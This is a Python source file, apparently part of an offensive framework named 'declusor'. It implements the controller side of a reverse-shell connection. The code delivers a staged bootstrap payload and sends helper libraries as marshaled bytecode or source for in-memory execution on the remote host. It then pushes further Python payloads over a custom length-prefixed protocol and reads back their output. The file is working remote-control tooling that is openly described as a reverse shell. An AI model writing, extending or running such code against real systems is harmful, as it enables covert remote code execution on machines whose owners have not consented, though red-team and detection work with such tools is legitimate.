"""Python reverse-shell client connection implementing RFC TLV binary protocol."""

import json
import struct
from collections.abc import Generator, Mapping

from declusor import config, contract, util

from .renderer import PySocketRenderer

__all__ = [
    "PySocketConnection",
    "PySocketRenderer",
]


class PySocketConnection(contract.IConnection):
    """``IConnection`` implementation for a Python-socket reverse-shell client."""

    def __init__(
        self,
        transport: contract.ITransport,
        renderer: contract.IOperationRenderer,
        files: contract.IPluginProcessor,
        /,
        *,
        expected_ack: bytes = util.hash_sha256(config.DEFAULT_CLIENT_ACK_SEED),
        timeout: float | None = config.DEFAULT_CONNECTION_TIMEOUT,
        stage1_payload: bytes | None = None,
        max_tlv_frame_size: int = config.MAX_TLV_FRAME_SIZE,
    ) -> None:
        """Initialize a new Python-socket client connection.

        Args:
            transport: Underlying byte-stream transport connected to the remote client.
            renderer: Operation renderer for command syntax formatting.
            files: Plugin processor for resolving and loading client libraries and modules.
            expected_ack: Expected client acknowledgment byte token verifying handshake.
            timeout: Optional transport I/O timeout in seconds.
            stage1_payload: Optional raw Stage-1 client bootstrap script transmitted during handshake for staged execution.
            max_tlv_frame_size: Maximum allowed TLV frame size in bytes.
        """

        self._renderer = renderer
        self._files = files
        self._transport = transport
        self._expected_ack = expected_ack
        self._stage1_payload = stage1_payload
        self._max_tlv_frame_size = max_tlv_frame_size
        self._state = contract.ConnectionState.CREATED
        self._client_runtime: Mapping[str, object] | None = None
        self._is_bytecode_compatible: bool = False
        self._active_commands: int = 0
        self._command_ready = util.TaskEvent()
        self._lock = util.TaskLock()

        if timeout is not None:
            self._transport.timeout = timeout

    @property
    def state(self) -> contract.ConnectionState:
        """Current lifecycle state of the connection."""

        return self._state

    @property
    def client_runtime(self) -> Mapping[str, object] | None:
        """Client runtime metadata negotiated during handshake, if available."""

        return self._client_runtime

    @property
    def is_bytecode_compatible(self) -> bool:
        """Whether the remote agent's Python bytecode format matches the server."""

        return self._is_bytecode_compatible

    @property
    def is_idle(self) -> bool:
        """Whether connection has completed all pending commands and is ready for new input."""

        with self._lock:
            return self._active_commands == 0

    @property
    def renderer(self) -> contract.IOperationRenderer:
        """The command syntax renderer."""

        return self._renderer

    @property
    def timeout(self) -> float | None:
        """Current transport timeout in seconds."""

        return self._transport.timeout

    @timeout.setter
    def timeout(self, value: float | None) -> None:
        """Set the underlying transport timeout."""

        self._transport.timeout = value

    def prepare_helpers_payload(self) -> bytes:
        """Prepare the helper library bundle in the negotiated encoding.

        If the remote agent is bytecode-compatible, compiles the concatenated
        helpers and serializes them using marshal. Otherwise, encodes the raw
        helpers as UTF-8 source code for target-side in-memory compilation.
        """

        raw_helpers = b"\n\n".join(self._files.load_all_helpers().values())
        helpers_source = raw_helpers.decode("utf-8", errors="replace")

        if self._is_bytecode_compatible:
            try:
                return util.lang.python.compile_and_serialize(helpers_source, "<helpers>")
            except SyntaxError:
                pass

        return helpers_source.encode("utf-8")

    def send_python_payload(self, source: str, filename: str = "<remote>") -> None:
        """Send a Python payload in the negotiated desired encoding.

        If the remote client is bytecode compatible, compiles and marshals the payload.
        Otherwise, sends the UTF-8 source string for target-side in-memory compilation.
        """

        if self._is_bytecode_compatible:
            try:
                payload = util.lang.python.compile_and_serialize(source, filename)
                self.write(payload)
                return
            except SyntaxError:
                pass

        self.write(source.encode("utf-8"))

    def handshake(self) -> None:
        """Perform the Python agent initialization handshake.

        Negotiates Python bytecode compatibility with the remote client, transmits
        the helper bundle in the negotiated desired encoding (precompiled marshaled
        bytecode if compatible, UTF-8 source otherwise), and verifies the client ACK token.
        """

        self.ensure_can_handshake()

        self._state = contract.ConnectionState.INITIALIZING

        try:
            self._transport.establish()
        except config.ConnectionError as error:
            self.close()
            raise config.ConnectionHandshakeError("Failed establishing transport session.", expected_ack=self._expected_ack) from error

        # Step 0: Transmit Stage 1 payload if staged launcher strategy
        if self._stage1_payload is not None:
            if len(self._stage1_payload) > self._max_tlv_frame_size:
                self.close()

                raise config.ConnectionHandshakeError(
                    f"Stage 1 payload exceeds maximum size of {self._max_tlv_frame_size} bytes.",
                    expected_ack=self._expected_ack,
                )

            stage_frame = struct.pack(">I", len(self._stage1_payload)) + self._stage1_payload

            try:
                self._transport.write(stage_frame)
            except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
                self.close()

                raise config.ConnectionHandshakeError(
                    "Failed delivering Stage 1 script during handshake.",
                    expected_ack=self._expected_ack,
                ) from error

        # Step 1: Read client runtime metadata TLV frame (channel 1)
        try:
            header = self._transport.read_exact(5)

            _, length = struct.unpack(">BI", header)

            if length > self._max_tlv_frame_size:
                raise config.ConnectionError(f"TLV frame payload size {length} exceeds maximum {self._max_tlv_frame_size}.")

            raw_meta = self._transport.read_exact(length) if length > 0 else b"{}"
            metadata = json.loads(raw_meta.decode("utf-8", errors="replace"))

            match metadata:
                case dict():
                    self._client_runtime = metadata
                    self._is_bytecode_compatible = util.lang.python.check_bytecode_compatibility(
                        metadata.get("magic", ""),
                        metadata.get("version", []),
                        metadata.get("implementation", "CPython"),
                    )
                case _:
                    self._is_bytecode_compatible = False
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            self.close()
            raise config.ConnectionHandshakeError(
                "Failed reading client runtime metadata during handshake.",
                expected_ack=self._expected_ack,
            ) from error
        except (json.JSONDecodeError, UnicodeDecodeError, TypeError, ValueError) as error:
            self.close()
            raise config.ConnectionHandshakeError(
                "Invalid client runtime metadata during handshake.",
                expected_ack=self._expected_ack,
            ) from error

        # Step 2: Transmit helper libraries in the negotiated desired encoding
        helpers_payload = self.prepare_helpers_payload()
        self.write(helpers_payload)

        # Step 3: Read and verify 32-byte client ACK token
        expected_ack = self._expected_ack

        try:
            received_ack = self._transport.read_exact(len(expected_ack))

            if received_ack != expected_ack:
                self.close()
                raise config.ConnectionHandshakeError(
                    "Invalid client ACK during session initialization.",
                    expected_ack=expected_ack,
                    received_ack=received_ack,
                )
        except config.ConnectionHandshakeError:
            raise
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            self.close()
            raise config.ConnectionHandshakeError(
                "Failed waiting for client ACK during session initialization.",
                expected_ack=expected_ack,
            ) from error

        self._state = contract.ConnectionState.CONNECTED

        with self._lock:
            self._active_commands = 0
            self._command_ready.clear()

    def write(self, data: bytes, /) -> None:
        """Send a command payload to the remote Python agent over the STDIN bus."""

        self.write_frame(config.ChannelType.STDIN, data)

    def write_frame(self, channel: config.ChannelType | int, data: bytes, /) -> None:
        """Send a TLV-framed payload on a specific bus to the remote Python agent."""

        self.ensure_can_perform_io()
        if len(data) > self._max_tlv_frame_size:
            raise ValueError(f"TLV frame payload exceeds maximum size of {self._max_tlv_frame_size} bytes.")

        frame = struct.pack(">BI", channel, len(data)) + data

        try:
            self._transport.write(frame)
        except (config.ConnectionClosed, config.ConnectionTimeoutError, config.ConnectionError) as error:
            raise config.ConnectionError(f"Failed to write to connection: {error}") from error

        if channel == config.ChannelType.STDIN:
            with self._lock:
                self._active_commands += 1
                self._command_ready.set()

    def read(self) -> Generator[bytes, None, None]:
        """Stream response chunks from the Python agent until a PROCESS_EXIT frame."""

        self.ensure_can_perform_io()

        with self._lock:
            has_command = self._active_commands > 0

        if not has_command:
            self._command_ready.wait(timeout=0.1)
            self.ensure_can_perform_io()
            with self._lock:
                has_command = self._active_commands > 0
            if not has_command:
                return

        with self._lock:
            if self._active_commands > 0:
                self._active_commands -= 1
                if self._active_commands == 0:
                    self._command_ready.clear()

        while True:
            try:
                header = self._transport.read_exact(5)
            except config.ConnectionTimeoutError:
                raise
            except (config.ConnectionClosed, config.ConnectionError) as error:
                raise config.ConnectionClosed(f"Connection interrupted during read: {error}") from error

            channel, length = struct.unpack(">BI", header)
            if length > self._max_tlv_frame_size:
                self.close()
                raise config.ConnectionClosed(f"TLV frame payload size {length} exceeds maximum {self._max_tlv_frame_size}.")

            if channel == config.ChannelType.PROCESS_EXIT:
                if length > 0:
                    try:
                        self._transport.read_exact(length)
                    except config.ConnectionTimeoutError:
                        raise
                    except (config.ConnectionClosed, config.ConnectionError) as error:
                        raise config.ConnectionClosed(f"Connection interrupted reading exit frame: {error}") from error

                return

            if length == 0:
                continue

            try:
                payload = self._transport.read_exact(length)
            except config.ConnectionTimeoutError:
                raise
            except (config.ConnectionClosed, config.ConnectionError) as error:
                raise config.ConnectionClosed(f"Connection interrupted reading payload: {error}") from error

            if channel in (config.ChannelType.STDOUT, config.ChannelType.STDERR):
                yield payload

    def __enter__(self) -> "PySocketConnection":
        """Enter context manager, returning self."""

        return self

    def __exit__(self, *_: object) -> None:
        """Exit context manager, closing connection transport."""

        self.close()

    def close(self) -> None:
        """Close the underlying transport idempotently."""

        if self.is_closed:
            return

        self._state = contract.ConnectionState.CLOSED
        with self._lock:
            self._command_ready.set()
        self._transport.close()
